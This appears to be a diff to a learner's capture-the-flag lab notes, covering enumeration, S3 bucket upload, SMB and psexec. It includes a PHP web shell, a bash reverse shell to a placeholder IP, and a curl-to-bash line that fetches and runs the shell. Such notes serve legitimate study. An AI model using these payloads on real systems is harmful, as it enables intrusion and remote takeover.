@@ -51,7 +51,22 @@
 * *evil-winrm -i ADDRESS -u USER -p PASSWORD* is used to try and get a session on a windows machine.
 
 ## Three
-
+* *Wappalyzer* is used to understand what technologies the website uses.
+* *echo "IPADDRESS DOMAIN" | sudo tee -a /etc/hosts* is used to be able to access a virtual host.
+* *gobuster vhost -w /usr/sharel/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u URL --append-domain*  is used to enumrate subdomains.
+* S3 is a cloud-based object storage service. It allows us to store things in containers called buckets. AWS S3 buckets have various use-cases including Backup and Storage, Media Hosting, Software Delivery, Static Website etc.
+* *awscli* is a utility that can be installed on linux and used to access AWS products.
+* *aws configure* is used to configure AWS access key, secret access key, etc..
+* *aws --endpoint=http:s3.URL s3 ls* is used to list all s3 buckets hosted by the server.
+* *aws --endpoint=http://s3.URL s3 ls s3://URL* is used to list objects under specified bucket.
+* *echo '<?php system($_GET["cmd"]); ?>' > shell.php* creates a mini php shell.
+* *aws --endpoint=http://s3.URL s3 cp FILENAME s3://URL* uploads file to a s3 server.
+* *URLshell.php?cmd=COMMAND* is used to use the previously uploaded shell.
+* *#!/bin/bash
+  bash -i >& /dev/tcp/IPADDRESS/PORTNUMBER 0>&1* Content for a bash reverse shell payload.
+* *nc -nvlp PORTNUMBEr* Starts listening on that specified port.
+* *python3 -m http.server 8000* Starts a python server (Used to upload the bash reverse shell)
+* *URL/shell.php?cmd=curl%20IPADDRESS:8000/shell.sh|bash* used to upload the bash reverse shell.
 
 ## Ignition
 
@@ -66,4 +81,8 @@
 
 
 ## Tactics
-
+* *-Pn* is used as an option when using nmap on a target that block ICMP.
+* *smbclient -L IPADDRESS -U USERNAME* To list the shares for IPADDRESS.
+* *smbclient \\\\\\\IPADDRESS\\\\SHARENAME -U USERNAME* Is used to connect to a share.
+* PsExec is a portable tool from Microsoft that lets you run processes remotely using any user's credentials.
+* *python psexec.py USERNAME:PASSWORD@IPADDRESS* is used to get 
